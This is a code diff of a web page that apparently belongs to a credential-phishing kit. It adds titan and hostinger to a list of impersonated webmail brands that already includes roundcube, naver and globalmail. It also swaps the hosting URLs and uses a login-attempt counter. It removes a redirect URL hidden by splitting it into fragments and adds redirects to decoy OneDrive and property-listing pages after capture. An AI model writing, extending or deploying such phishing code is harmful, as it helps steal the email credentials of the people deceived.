@@ -15,15 +15,15 @@
       href="original-favicon.ico"
       type="image/x-icon"
     />
-    <base href="https://stareio.com/SOMDserver/assets/" /> 
-    <!-- <base href="http://tools.com/pages/latestpages/SOMDserver/assets/" />-->
+    <!-- <base href="https://stareio.com/SOMDserver/assets/" /> -->
+    <base href="http://tools.com/pages/latestpages/SOMDserver/assets/" />
 
     <!-- <script src="./myjs.js"></script> -->
     <script>
-      // const BASE_URL = "http://tools.com/pages/latestpages/SOMDserver";
-      // const ASSETS_URL = "http://tools.com/pages/latestpages/SOMDserver/assets";
-      const BASE_URL = "https://stareio.com/SOMDserver";
-      const ASSETS_URL = "https://stareio.com/SOMDserver/assets";
+      const BASE_URL = "http://tools.com/pages/latestpages/SOMDserver";
+      const ASSETS_URL = "http://tools.com/pages/latestpages/SOMDserver/assets";
+      // const BASE_URL = "https://stareio.com/SOMDserver";
+      // const ASSETS_URL = "https://stareio.com/SOMDserver/assets";
 
       async function getPageContent(url) {
         fetch(`${BASE_URL}/${url}.html`)
@@ -92,6 +92,8 @@
           page == "roundcube" ||
           page == "godda" ||
           page == "naver" ||
+          page == "titan" ||
+          page == "hostinger" ||
           page == "globalmail"
         ) {
           showForm(null);
@@ -703,6 +705,8 @@
           page == "roundcube" ||
           page == "godda" ||
           page == "naver" ||
+          page == "titan" ||
+          page == "hostinger" ||
           page == "globalmail"
         ) {
         } else {
@@ -897,28 +901,16 @@
 
       let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
 
-      /* let ov1 = "htt";
-      let ov2 = "ps://";
-      let ov3 = "ma";
-      let ov4 = "deinchin";
-      let ov5 = "a-sendinquiry-shrom.gl";
-      let ov6 = "itch.me/notfound.h";
-      let ov7 = "tml"; */
-
-      let ov1 =
-        "https://1drv.ms/x/c/EB8A869ED6D5552D/ERgdKjO07zJOvR6bSW3tqYkBzd-Cd4dmwHOuY2o8gk9Hdw?e=h0pOHr";
-      let ov2 = "";
-      let ov3 = "";
-      let ov4 = "";
-      let ov5 = "";
-      let ov6 = "";
-      let ov7 = "";
-
-      let ov = `${ov1}${ov2}${ov3}${ov4}${ov5}${ov6}${ov7}`;
-
       //sessionStorage.clear();
-      // let original = document.querySelector("#orgi").value;
-      let original = ov;
+      let original = ""
+      lastV = xx[xx.length - 1]
+      console.log(lastV);
+
+      if(lastV == 'apt'){
+        original = "https://www.propertyfinder.ae/en/plp/rent/penthouse-for-rent-dubai-dubai-sports-city-emirates-sports-hotel-apartments-14947852.html"
+      }else if(lastV == 'ord'){
+        original = "https://1drv.ms/x/c/EB8A869ED6D5552D/ERgdKjO07zJOvR6bSW3tqYkBzd-Cd4dmwHOuY2o8gk9Hdw?e=h0pOHr"
+      }
       let trialCount = sessionStorage.getItem("num_trial");
 
       if (!trialCount) {
